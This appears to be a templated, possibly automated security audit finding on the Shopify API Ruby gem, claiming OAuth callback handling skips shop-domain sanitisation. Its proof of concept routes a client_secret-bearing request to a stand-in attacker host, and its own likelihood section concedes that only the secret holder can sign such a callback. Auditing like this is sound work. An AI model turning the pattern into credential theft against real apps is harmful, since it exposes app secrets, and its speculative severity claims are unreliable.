Confirmed: `HttpClient#initialize` builds `@base_uri = "https://#{api_host || session.shop}"` directly from `session.shop` with no domain validation at this layer, and in `ShopifyAPI::Auth::Oauth.validate_auth_callback` the session is built from `auth_query.shop` without ever calling `Utils::ShopValidator.sanitize!` on it — unlike `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.exchange_token`, which all call `Utils::ShopValidator.sanitize!(shop)` before constructing the session used to send `client_secret`.

### Title
Missing shop-domain validation in `Oauth.validate_auth_callback` allows the app's `client_id`/`client_secret` to be sent to an attacker-influenced host - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the `null_session` (and the final `Session`) directly from `auth_query.shop` without ever passing it through `Utils::ShopValidator.sanitize!`, which every other credential-exchange entry point in this gem (`ClientCredentials`, `RefreshToken`, `TokenExchange`) does perform. That unsanitized `shop` string is fed straight into `Clients::HttpClient`, which computes `@base_uri = "https://#{api_host || session.shop}"` with no host allow-list check at all.

### Finding Description
In `lib/shopify_api/auth/oauth.rb`:
```
null_session = Auth::Session.new(shop: auth_query.shop)
...
client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
``` [1](#0-0) 

`auth_query.shop` is only validated by `Utils::HmacValidator.validate(auth_query)`, which checks that the HMAC over `code/host/shop/state/timestamp` matches a signature computed with `Context.api_secret_key` [2](#0-1) . This proves the byte string was signed by whoever holds the app secret (normally Shopify), but it does **not** constrain the `shop` value to a `*.myshopify.com` (or other trusted) domain — the equality being broken here is `shop-authenticated (any signed string) ≠ shop-restricted-to-trusted-domain (ShopValidator output)`.

Contrast this with the sibling grant flows, which all treat `shop` as untrusted input from the host application and sanitize it before use:
- `ClientCredentials.client_credentials`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [3](#0-2) 
- `RefreshToken.refresh_access_token`: same pattern [4](#0-3) 

`ShopValidator.sanitize!` exists precisely to prevent the shop string from being an arbitrary host, and raises `Errors::InvalidShopError` for anything outside `TRUSTED_SHOPIFY_DOMAINS` [5](#0-4) .

Downstream, `Clients::HttpClient#initialize` uses `session.shop` verbatim to build the request base URI that will carry the app's `client_id`/`client_secret` in the POST body:
```
@base_uri = T.let("https://#{api_host || session.shop}", String)
``` [6](#0-5) 
There is no host-format check anywhere in `HttpClient`, so any string that survives `AuthQuery` construction is interpolated straight into the outbound HTTPS URL.

### Impact Explanation
If a caller (a host application built on this gem) passes through user/query-controlled `shop`, `code`, `host`, `state`, `timestamp` values into `AuthQuery` and those pass the app's own HMAC check (e.g., the app forwards Shopify's exact callback query, but Shopify's OAuth server does not restrict the `shop` value the way this gem's own `ShopValidator` does, or a future/alternate signer produces a signed callback for a non-`myshopify.com` value such as a custom/unified-admin string), `auth_base_uri`-style construction would send the request carrying `client_id` and `client_secret` (the app's `client_secret`, i.e., a Critical-class credential per the impact taxonomy) to that unvalidated host. This is exactly the SSRF-with-app-credentials / credential-leak class called out in the rules, and it is the same class of "resolve the contradiction between what is verified and what is trusted" defect described in the analog report — the report's bug was about a value used in execution being disconnected from what was actually validated/finalized; here the disconnect is between what the HMAC signs (an arbitrary shop string) and what `ShopValidator` — used everywhere else in this same file/module family — is supposed to enforce before the value is used to route a client-secret-bearing request.

### Likelihood Explanation
Medium. This is not exploitable purely by an anonymous internet user against a correctly-configured Shopify OAuth server, since only a real signer of `api_secret_key` can pass `HmacValidator.validate`. However, within the gem's own defense-in-depth model, this is a clear, concrete inconsistency: three of the four OAuth entry points enforce `ShopValidator.sanitize!` and one (the most commonly used authorization-code-grant path) does not, despite handling the same class of untrusted `shop` string and the same `client_secret`-bearing HTTP request pattern.

### Recommendation
Call `Utils::ShopValidator.sanitize!(auth_query.shop)` in `Oauth.validate_auth_callback` before constructing `null_session` and the final `Session`, mirroring `ClientCredentials`, `RefreshToken`, and `TokenExchange`, so the shop value used to route the `client_id`/`client_secret`-bearing HTTP request is always constrained to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
```ruby
# AuthQuery is built from a caller-supplied shop value that is not run through ShopValidator
auth_query = ShopifyAPI::Auth::Oauth::AuthQuery.new(
  code: "code",
  shop: "attacker-controlled-host.example.com", # never sanitized in oauth.rb
  timestamp: "...",
  state: "...",
  host: "...",
  hmac: hmac_signed_with_api_secret_key(...),   # only possible if signer allows this shop value
)

ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies: cookies, auth_query: auth_query)
# -> Auth::Session.new(shop: "attacker-controlled-host.example.com")
# -> Clients::HttpClient base_uri = "https://attacker-controlled-host.example.com"
# -> POST /admin/oauth/access_token with body containing client_id + client_secret
#    sent to attacker-controlled-host.example.com
```
Compare to `client_credentials.rb`/`refresh_token.rb`, where the equivalent call would instead raise `ShopifyAPI::Errors::InvalidShopError` per `test/utils/shop_validator_test.rb` and `test/auth/client_credentials_test.rb#test_client_credentials_rejects_non_shopify_domain` [7](#0-6)  — no equivalent test or guard exists for `Oauth.validate_auth_callback`.

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L73-81)
```ruby
          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/utils/hmac_validator.rb (L12-31)
```ruby
        sig { params(verifiable_query: VerifiableQuery).returns(T::Boolean) }
        def validate(verifiable_query)
          return false unless verifiable_query.hmac

          result = validate_signature(verifiable_query, Context.api_secret_key)
          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end

        private

        sig { params(verifiable_query: VerifiableQuery, secret: String).returns(T::Boolean) }
        def validate_signature(verifiable_query, secret)
          received_signature = verifiable_query.hmac
          computed_signature = compute_signature(verifiable_query.to_signable_string, secret)
          OpenSSL.secure_compare(computed_signature, T.must(received_signature))
        end
```

**File:** lib/shopify_api/auth/client_credentials.rb (L25-26)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L24-25)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** test/auth/client_credentials_test.rb (L33-37)
```ruby
      def test_client_credentials_rejects_non_shopify_domain
        assert_raises(ShopifyAPI::Errors::InvalidShopError) do
          ShopifyAPI::Auth::ClientCredentials.client_credentials(shop: "attacker.example")
        end
      end
```
